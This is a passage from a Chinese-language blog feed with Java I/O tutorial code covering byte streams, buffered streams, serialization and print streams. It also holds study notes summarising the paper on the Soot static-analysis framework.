class="line"><span class="comment">// 读取到末尾,返回‐1</span></span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println(read);</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br><span class="line">‐<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>循环改进读取方式，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>);</span><br><span class="line"><span class="comment">// 定义变量，保存数据</span></span><br><span class="line"><span class="keyword">int</span> b ；</span><br><span class="line"><span class="comment">// 循环读取</span></span><br><span class="line"><span class="keyword">while</span> ((b = fis.read())!=‐<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println((<span class="keyword">char</span>)b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

<p>使用字节数组读取：</p>
<p><code>read(byte[] b)</code>，每次读取b的长度个字节到数组中，返回读取到的有效字节个数，读 取到末尾时，返回 -1 ，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象.</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>); <span class="comment">// 文件中为abcde</span></span><br><span class="line"><span class="comment">// 定义变量，作为有效个数</span></span><br><span class="line"><span class="keyword">int</span> len ；</span><br><span class="line"><span class="comment">// 定义字节数组，作为装字节数据的容器,大小为2</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span>];</span><br><span class="line"><span class="comment">// 循环读取</span></span><br><span class="line"><span class="keyword">while</span> (( len= fis.read(b))!=‐<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 每次读取后,把数组变成字符串打印</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(b，<span class="number">0</span>，len));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">ab</span><br><span class="line">cd</span><br><span class="line">ed</span><br></pre></td></tr></table></figure>

<p>复制图片文件，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Copy</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 1.创建流对象</span></span><br><span class="line"><span class="comment">// 1.1 指定数据源</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"D:\\test.jpg"</span>);</span><br><span class="line"><span class="comment">// 1.2 指定目的地</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"test_copy.jpg"</span>);</span><br><span class="line"><span class="comment">// 2.读写数据</span></span><br><span class="line"><span class="comment">// 2.1 定义数组</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">// 2.2 定义长度</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="comment">// 2.3 循环读取</span></span><br><span class="line"><span class="keyword">while</span> ((len = fis.read(b))!=‐<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 2.4 写出数据</span></span><br><span class="line">fos.write(b, <span class="number">0</span> , len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3.关闭资源</span></span><br><span class="line">fos.close();</span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h1><p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429214541228.png" alt="image-20200429214541228"></p>
<h2 id="字节缓冲流-BufferedInputStream-OutputStream"><a href="#字节缓冲流-BufferedInputStream-OutputStream" class="headerlink" title="字节缓冲流 BufferedInputStream/OutputStream"></a>字节缓冲流 BufferedInputStream/OutputStream</h2><p>构造方法</p>
<p><code>public BufferedInputStream(InputStream in)</code> ：创建一个 新的缓冲输入流。 <code>public BufferedOutputStream(OutputStream out)</code> ： 创建一个新的缓冲输出流。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建字节缓冲输入流</span></span><br><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"bis.txt"</span>));</span><br><span class="line"><span class="comment">// 创建字节缓冲输出流</span></span><br><span class="line">BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"bos.txt"</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferedDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="keyword">try</span> (</span><br><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"jdk9.exe"</span>));</span><br><span class="line">BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"copy.exe"</span>));</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">// 读写数据</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>*<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> ((len = bis.read(bytes)) != ‐<span class="number">1</span>) &#123;</span><br><span class="line">bos.write(bytes, <span class="number">0</span> , len);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">"缓冲流使用数组复制时间:"</span>+(end ‐ start)+<span class="string">" 毫秒"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">缓冲流使用数组复制时间:<span class="number">666</span> 毫秒</span><br></pre></td></tr></table></figure>

<p>特有方法：</p>
<p>字符缓冲流的基本方法与普通字符流调用方式一致，不再阐述，我们来看它们具备的特有方法。 </p>
<p><code>BufferedReader</code>： <code>public String readLine()</code> : 读一行文字。 <code>BufferedWriter</code>： <code>public void newLine()</code> : 写一行行分隔符,由系统属性定义符号。</p>
<p>readLine 方法演示，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferedReaderDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"in.txt"</span>));</span><br><span class="line"><span class="comment">// 定义字符串,保存读取的一行文字</span></span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// 循环读取,读取到最后返回null</span></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="keyword">null</span>) &#123;</span><br><span class="line">System.out.print(line);</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">br.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileOutputStream fileOut = <span class="keyword">new</span> FileOutputStream(<span class="string">"employee.txt"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> </span>&#123;</span><br><span class="line">Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">e.name = <span class="string">"zhangsan"</span>;</span><br><span class="line">e.address = <span class="string">"beiqinglu"</span>;</span><br><span class="line">e.age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建序列化流对象</span></span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"employee.txt"</span>));</span><br><span class="line"><span class="comment">// 写出对象</span></span><br><span class="line">out.writeObject(e);</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">out.close();</span><br><span class="line">fileOut.close();</span><br><span class="line">System.out.println(<span class="string">"Serialized data is saved"</span>); <span class="comment">// 姓名，地址被序列化，年龄没有被序列</span></span><br><span class="line">化。</span><br><span class="line">&#125; <span class="keyword">catch</span>(IOException i) &#123;</span><br><span class="line">i.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">Serialized data is saved</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建反序列化流</span></span><br><span class="line">FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"employee.txt"</span>);</span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line"><span class="comment">// 读取一个对象</span></span><br><span class="line">e = (Employee) in.readObject();</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">in.close();</span><br><span class="line">fileIn.close();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 调用系统的打印流,控制台直接输出97</span></span><br><span class="line">System.out.println(<span class="number">97</span>);</span><br><span class="line"><span class="comment">// 创建打印流,指定文件的名称</span></span><br><span class="line">PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">"ps.txt"</span>);</span><br><span class="line"><span class="comment">// 设置系统的打印流流向,输出到ps.txt</span></span><br><span class="line">System.setOut(ps);</span><br><span class="line"><span class="comment">// 调用系统的打印流,ps.txt中输出97</span></span><br><span class="line">System.out.println(<span class="number">97</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>一个Java对象的内存图</title>
    <url>/%E4%B8%80%E4%B8%AAJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%86%85%E5%AD%98%E5%9B%BE/</url>
    <content><![CDATA[<p><img src="../images/%E4%B8%80%E4%B8%AAJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%86%85%E5%AD%98%E5%9B%BE/image-20200427210136800.png" alt="image-20200427210136800"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Soot</title>
    <url>/Soot/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>跬步而不休，跛鳖千里。</p>
</blockquote>
<p>今天来学习Soot，主要来膜拜这篇神文。</p>
<p><a href="http://sable.github.io/soot/resources/lblh11soot.pdf" target="_blank" rel="noopener">http://sable.github.io/soot/resources/lblh11soot.pdf</a></p>
<a id="more"></a>

<h1 id="I-INTRODUCTION"><a href="#I-INTRODUCTION" class="headerlink" title="I. INTRODUCTION"></a>I. INTRODUCTION</h1><p><a href="https://github.com/Sable/soot" target="_blank" rel="noopener">Soot</a>是一款针对Java语言进行静态分析的框架，诞生于2000年。</p>
<p>它允许研究人员在它的基础上开发静态分析工具。</p>
<p>针对它的核心来说，它是一款编译器。</p>
<p>它接收JVM字节码文件或者Java源码，并且主要返回Java字节码。</p>
<p>Soot的主要特点：</p>
<ol>
<li>简化JVM的字节码文件，转换为三地址码的中间表示形式；</li>
<li>大量的指针分析；</li>
<li>调用图构造算法API；</li>
<li>可以生成可执行的JVM字节码文件；</li>
</ol>
<h1 id="Ⅱ-FEATURES"><a href="#Ⅱ-FEATURES" class="headerlink" title="Ⅱ. FEATURES"></a>Ⅱ. FEATURES</h1><p>##程序内特征 intraprocedual</p>
<p>Soot的基本中间代码表示形式是Jimple，Jimple就是一种三地址代码。</p>
<p>Jimple诞生的初衷是由于：</p>
<p>直接分析字节码是很困难的。</p>
<p>尽管可以为Java字节码构造控制流图，但是往往隐式的堆栈活动会掩盖住数据流。</p>
<p>并且对于一个给定的字节码指令s来说，基于堆栈的s的输入往往并不是在变址处产生的。</p>
<p>所以soot的作者发现，<strong>将数据存储在指定的局部变量中，而不是隐式堆栈中，可以使得数据的局部流(沿着Jimple的控制流图)更加明显。</strong></p>
<p>Jimple内的本地变量会根据（定义-使用链）(<em>define-use chains</em>)进行分类。</p>
<p>Soot内部还有其他中间表示形式：</p>
<ul>
<li><p><strong>Shimple</strong>是基于SSA版本的Jimple；</p>
</li>
<li><p><strong>Baf</strong>和<strong>Grimple</strong>是用来生成字节码的；</p>
</li>
<li><p><strong>Dava</strong>是一个抽象的基于语法树的中间表示，它是由jimple IR反编译生成的。</p>
</li>
</ul>
<p>Java字节码包含了原始源代码的类和方法结构等许多信息，所以在Soot的分析过程中，Soot可以自由地利用类和方法名信息。</p>
<p>Soot还可以为它所分析的方法提供行号和变量名信息。</p>
<p><img src="../images/Soot/image-20200424175153089.png" alt="image-20200424175153089"></p>
<p>Soot最强大的一点是用户可以通过指定抽象类和实现该抽象的函数来创建数据流分析。</p>
<p>Soot还为常见的抽象类提供了适配的数据结构实现。</p>
<h2 id="过程间分析-interprocedural"><a href="#过程间分析-interprocedural" class="headerlink" title="过程间分析 interprocedural"></a>过程间分析 interprocedural</h2><p>复杂的静态分析需要调用图和指针信息，这从根本上讲是一个过程间的问题。 </p>
<p>Soot包括Spark指针分析工具包，并且还支持基于BDD的PADDLE指针分析框架，该框架增加了上下文相关性。</p>
<h3 id="调用图-Call-Graph"><a href="#调用图-Call-Graph" class="headerlink" title="调用图 Call Graph"></a>调用图 Call Graph</h3><p>Soot框架提供了调用图信息。对于每个调用点（call site），静态分析（尤其是过程间分析）需要知道该调用点的所有可能调用目标。</p>
<p> Java的面向对象性质使此问题复杂化，因为被调用者（或目标）的身份取决于虚拟调用的接收者对象的<strong>运行时类型</strong>，而Java程序中的大多数调用都是虚拟调用。</p>
<p>Spark的调用图构造算法会计算出运行时可能发生的一组调用的近似值。调用图边连接源（表示为（方法，语句）对）和目标（始终是方法中的第一个语句）。</p>
<p><em>Over-approximation</em>意味着在程序的任何执行中可能发生的任何调用都必须出现在调用图中。</p>
<p>Spark实现了许多不同的调用图构造方法，包括类层次分析和快速类型分析。</p>
<p>但是，我们发现最有效的调用图构造方法是按需进行的，并在计算点对集的同时构建调用图，从CHA调用图作为可到达组的初始近似值的开始方法。</p>
<p>可以通过查询call site生成调用图； 通过调用方法； 或“向后”（按目标方法）。</p>
<p>出于效率考虑，Spark返回迭代器作为调用图查询的结果。 Spark还为客户提供了任何方法或语句的可传递目标集。 最后，Spark还公开了程序的可访问方法集-从程序的入口点可传递地访问的方法集（除程序的main（）方法外，还包括类初始化等）。</p>
<h3 id="指针分析-Pointer-Analyses"><a href="#指针分析-Pointer-Analyses" class="headerlink" title="指针分析 Pointer Analyses"></a>指针分析 Pointer Analyses</h3><p>许多静态分析需要指针信息：</p>
<p>它们需要知道两个变量p和q在运行时是否可以引用同一堆对象。 </p>
<p>Spark实现了上下文无关的基于子集的指向分析（Andersenstyle）。</p>
<p>分析可以查询要点分析，并获得由PointToSet表示的局部变量或对象字段所指向的对象的抽象。 </p>
<p>PointsToSet支持两个查询：</p>
<ol>
<li>集合中对象的可能类型集合；</li>
<li>两个PointsToSet对象是否具有非空交集。 可能的类型将有关方法调用的可能接收者的信息提供给变量，该变量的值指向设置的模型。 如果变量p和q具有非空交点的指向集，则它们可能指向同一对象。</li>
</ol>
<h3 id="副作用分析-Side-Effects"><a href="#副作用分析-Side-Effects" class="headerlink" title="副作用分析 Side Effects"></a>副作用分析 Side Effects</h3><p>副作用分析建立在（任何基于Soot的）指向和调用图分析之上。</p>
<p>副作用分析可以确定语句s是否可能依赖于语句s’。 它通过为每个语句定义读写集，然后比较它们的交集来工作。 </p>
<p>两个具有不相交的读写集的语句是独立的，而先写一个值的语句后跟另一个读相同值的语句遵循一个依赖关系。</p>
<h3 id="Spark的替代和扩展"><a href="#Spark的替代和扩展" class="headerlink" title="Spark的替代和扩展"></a>Spark的替代和扩展</h3><p>尽管Spark是Soot的基本调用图和指针分析生成器，但它不是唯一的选择。 </p>
<p> PADDLE 提供了基于BDD的上下文敏感指针分析； 但是，它在构建时和在运行时都需要额外的依赖关系。</p>
<p>到目前为止，虽然我们已经描述了指针分析都是可能别名分析<em>may-alias</em>，但Soot还包含了过程内必需别名分析must-alias。 </p>
<p>对象代表将此必须别名分析与过程内和整个程序的可能别名分析相集成； Spark是整个程序可能别名分析的来源之一。</p>
<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>许多Java程序都使用反射来按名称访问类或其成员。 </p>
<p>这种反映性访问很难静态分析：</p>
<p>类和方法名称可以在运行时计算，也可以从静态分析无法访问的文件中加载。</p>
<p> 一种解决方法是在运行时记录有关反射用法的信息（需要训练），并在执行调用图和指向分析时使用此信息。</p>
<h2 id="Soot输出"><a href="#Soot输出" class="headerlink" title="Soot输出"></a>Soot输出</h2><p>Soot支持使分析结果可用的多种机制。</p>
<p>开发人员的选择包括：</p>
<p>1）输出转换后的类文件； </p>
<p>2）输出错误信息；</p>
<p> 3）生成包含分析结果的HTML或图形；</p>
<p>4）创建（潜在转换的）类文件，并从程序分析中获得结果。</p>
<p>一个使用Soot变换类文件的工具示例是DUSC工具。</p>
<p>该工具通过首先对应用程序执行保留语义的转换以实现动态更新，然后为应用程序的新版本创建Java类，从而可以在运行时进行交换，从而实现Java程序的动态软件更新。</p>
<p>Soot还可以实现不保留语义的转换。</p>
<p> Tkachuk和Dwyer使用Soot生成了系统环境行为的不可执行的摘要，从而简化了系统的后续模型检查。生成的环境摘要包括实际环境的所有可能影响，并使用Java字节码表示，并用特殊的建模原语（使用方法调用编写）扩充了这些摘要。</p>
<h1 id="III-WORKING-WITH-AND-EXTENDING-SOOT"><a href="#III-WORKING-WITH-AND-EXTENDING-SOOT" class="headerlink" title="III. WORKING WITH AND EXTENDING SOOT"></a>III. WORKING WITH AND EXTENDING SOOT</h1><h2 id="运行Soot"><a href="#运行Soot" class="headerlink" title="运行Soot"></a>运行Soot</h2><p>在命令行上运行Soot是与Soot交互的最简单方法。 </p>
<p>Jimple代码作为Java字节码的清理版本对人类很有用。实际上，我们专门为此目的创建了Jimple的Jimp方言。它牺牲了可读性的完整性，例如通过省略字段的全名。完整的Jimple可以重新编译为Java字节码，而Jimp对于手动检查最有用。</p>
<p>Soot也可以优化字节码。但是，现代Java虚拟机和实时编译器在优化代码方面做得非常出色（使用仅在运行时可用的信息），因此Soot的优化不会提高常规字节码的性能。该优化对于非标准字节码（例如abc AspectJ编译器生成的字节码）很有用。</p>
<p>运行Soot的另一种方法是通过其Eclipse插件。 Eclipse插件允许用户调用Soot（或其增强版本）。但是，更重要的是，它还允许用户查看Jimple CFG和静态分析结果。特别是，Soot Eclipse插件使开发人员可以在计算时查看流量分析结果。另外，该插件可以显示汇总分析结果的属性。</p>
<h2 id="Building-on-soot"><a href="#Building-on-soot" class="headerlink" title="Building on soot"></a>Building on soot</h2><p>要使用Soot进行程序分析研究，用户必须编写扩展Soot功能的编译器遍历。</p>
<p>Soot提供两种基本的通行证类型：BodyTransformers和SceneTransformers。 </p>
<p><strong>BodyTransformer</strong>最适合进行过程内分析，并在程序中的每种方法上执行。 </p>
<p><strong>SceneTransformer</strong>仅执行一次，并且可能会分析并处理整个程序。</p>
<p>这些Transformer属于Packs，它们对应于编译器遍历的集合。我们已经记录了Soot开箱即用的套件包，研究人员可以自由地将其添加到所提供的套件（如果它在适当的阶段运行），或者创建自己的套件。</p>
<p>不同的Transformer可以通过共享包含分析结果的Map或使用属性进行通信。</p>
<p>我们明确选择禁止在IR语句上存储信息（例如，通过对Jimple Stmts进行子类化）来进行分析，因为这很难进行不同的分析。</p>
<p>我们建议用户通过创建自己的自定义主类来向Soot添加通行证，该类通过添加适当的Transformer来操纵Soot的Pack，然后调用Soot main（）方法。</p>
<p> Soot的Eclipse插件可用于生成此用例的模板（文件→新建→示例）。也可以手动调用Soot的main（）方法在自己的代码中调用的不同方法。尽管这是使用Soot的更灵活的方法，但我们不建议大多数用户使用它。</p>
<h1 id="IV-SOOT-DEVELOPMENT-PROCESS-AND-COMMUNITY"><a href="#IV-SOOT-DEVELOPMENT-PROCESS-AND-COMMUNITY" class="headerlink" title="IV. SOOT DEVELOPMENT PROCESS AND COMMUNITY"></a>IV. SOOT DEVELOPMENT PROCESS AND COMMUNITY</h1><p>Soot最初是由Raja Vall´ee-Rai提出的理学硕士论文。</p>
<p>最初的开发发生在对Java进行分析的最初兴趣激增期间。</p>
<p>这种情况发生在1999–2000年，并最终发布了可行的过程内Java分析框架Soot 1.0。 </p>
<p>Soot确实可以从这些程序的字节码（而不是源代码）开始对Java程序进行复杂的分析。自最初发布以来，Soot已添加了许多功能。</p>
<p>Soot的核心开发围绕麦吉尔大学的Sable实验室进行。</p>
<p>Soot的主要维护者的角色已经在麦吉尔的许多学生和校友中轮换。</p>
<h2 id="A-Support-and-Community"><a href="#A-Support-and-Community" class="headerlink" title="A. Support and Community"></a>A. Support and Community</h2><p>有问题写邮件！</p>
<h2 id="B-Documentation"><a href="#B-Documentation" class="headerlink" title="B. Documentation"></a>B. Documentation</h2><p>文档的最基本形式是API设计。</p>
<p>第一作者回顾了与Raja进行的有关Soot API设计的广泛讨论。</p>
<p>我们认为核心内部Soot API具有合理的自我文档编制和易用性。 Soot还提供了一些Javadoc文档注释来阐明API，但是提供完整的Javadoc覆盖范围非常繁琐。除非以某种方式众包此类文档，否则期望研究编译器框架附带完整的Javadoc文档注释是不合理的。</p>
<p>我们相信，我们已经为研究编译器提供了人们所希望的最好的东西：良好的API设计以及偶尔的Javadoc注释。</p>
<p>Soot团队还创建了一组文档，解释了如何使用Soot执行各种任务。这些文档将引导读者完成诸如执行数据流分析和向Java类文件添加属性的任务。</p>
<p><a href="https://www.brics.dk/SootGuide/sootsurvivorsguide.pdf" target="_blank" rel="noopener">soot-survivor-guide</a></p>
<p><a href="https://github.com/Sable/soot/wiki/Tutorials" target="_blank" rel="noopener">soot-wiki</a></p>
<p>我们要指出的一种Soot帮助形式是错误消息。</p>
<p>两个常见的触发点是OutOfMemoryError和incomplete-classpath错误。</p>
<p>发生内存不足错误是因为Java虚拟机的默认内存分配不足以运行整个程序指针分析。因此，Soot会捕获此错误并显示一条错误消息，告诉用户如何增加内存分配。由于Soot需要程序的所有库来进行指针分析，因此会出现不完整类路径错误。当无法找到所需的类时，建议用户包括jce.jar和jsse.jar文件，它们很可能会丢失。</p>
<h1 id="V-SOOT-’-S-PAST-EVOLUTION-FUTURE-WORK-ON-SOOT"><a href="#V-SOOT-’-S-PAST-EVOLUTION-FUTURE-WORK-ON-SOOT" class="headerlink" title="V. SOOT ’ S PAST EVOLUTION + FUTURE WORK ON SOOT"></a>V. SOOT ’ S PAST EVOLUTION + FUTURE WORK ON SOOT</h1><h2 id="Singletons-and-multiple-Soot-runs"><a href="#Singletons-and-multiple-Soot-runs" class="headerlink" title="Singletons and multiple Soot runs"></a>Singletons and multiple Soot runs</h2><p>Soot的最初设计在许多地方都使用了Singleton单例设计模式。 对于希望从自己的客户端代码多次调用Soot的用户而言，这是非常不便的。 我们重构了Soot以消除大多数单例和全局变量，将剩余的全局变量合并为G单例，并实施了静态分析以检测不在G中的单例和全局变量。我们还添加了G.reset（）方法，重置Soot的状态。</p>
<h2 id="Partial-programs"><a href="#Partial-programs" class="headerlink" title="Partial programs"></a>Partial programs</h2><p>Soot要求为整个程序分析（例如指针分析）计算sound结果。 但是，许多应用程序（尤其是基于Eclipse的软件工程应用程序）没有或不需要整个程序。</p>
<p>最近，我们还修复了Soot在不使用所有引用库的情况下对Java字节码进行分析的支持。</p>
<h2 id="Java-front-end-parsers"><a href="#Java-front-end-parsers" class="headerlink" title="Java front-end parsers"></a>Java front-end parsers</h2><p>Soot最初不包括Java前端解析器。 幸运的是，这个问题引起了很多关注，并且Soot获得了基于Polyglot的Java前端，以及后来的Java 1.5兼容JastAddbased前端。</p>
<h2 id="Increased-efﬁciency"><a href="#Increased-efﬁciency" class="headerlink" title="Increased efﬁciency"></a>Increased efﬁciency</h2><p>在需求驱动的基础上，我们提高了Soot选定零件的性能。 我们注意到，不可能从一开始就预测应该对哪些零件进行优化。 改进了类层次结构，紧密连接的组件，局部类型推断和局部def / uses计算器的应用，从而使Soot受益匪浅。</p>
<h2 id="A-Future-Directions-for-Soot"><a href="#A-Future-Directions-for-Soot" class="headerlink" title="A. Future Directions for Soot"></a>A. Future Directions for Soot</h2><p>我们确定了Soot未来改进的三个方向：更快的启动和计算时间；过程间分析支持；并支持Java语言扩展。</p>
<p>任何使用整个程序分析结果的分析都必须等待Soot解析成千上万的类文件。问题在于，即使最小的Java程序也包含对Java类库的依赖关系，该依赖关系在库类之间具有广泛的交叉引用。结果是，一旦分析需要指针分析结果，Soot的运行时间就会从不到10秒增加到超过一分钟。我们认为，也许可以使用Gligoric等人的技术一劳永逸地序列化Java类库生成的Jimple代码。这将为Soot分析提供更快的启动时间。从改写Jimple创建代码和使用多个线程创建Jimple代码（还自2000年起就是一个不错的项目）开始，也可以提高性能。</p>
<p>尽管Soot对过程内分析提供了出色的支持，但过程间分析的开发人员却更多地留给了他们自己的设备。如上所述，Soot为新颖的过程间分析的作者提供了SceneTransformer。不幸的是，对于这样的作者，SceneTransformer在构造分析时没有提供任何帮助。特别是，一个Soot用户需要弄清楚如何遍历被分析程序的类，以及如何组合来自不同方法的分析结果。定义常见情况并使其易于编程的一些设计工作可能会帮助很多分析作者。</p>
<p>最后，从历史上看，使用Soot评估语言扩展（例如类型系统扩展）是困难的。尽管Soot对字节码进行了广泛的类型推断，但要在Soot的IR中获取源代码注释（例如类型注释）并不容易。现在，使用JastAdd前端可以更轻松地进行此类研究。但是，我们不知道有任何项目研究Java语言扩展，因此Soot会分析以扩展Java源语言给出的程序。</p>
<h1 id="VI-REFLECTIONS-ON-SOOT"><a href="#VI-REFLECTIONS-ON-SOOT" class="headerlink" title="VI. REFLECTIONS ON SOOT"></a>VI. REFLECTIONS ON SOOT</h1><p>在本节中，我们将介绍在开发Soot方面遇到的困难，为将来的编译器框架提出所需的功能，并以对Soot成功的原因的一些结论作为结论。</p>
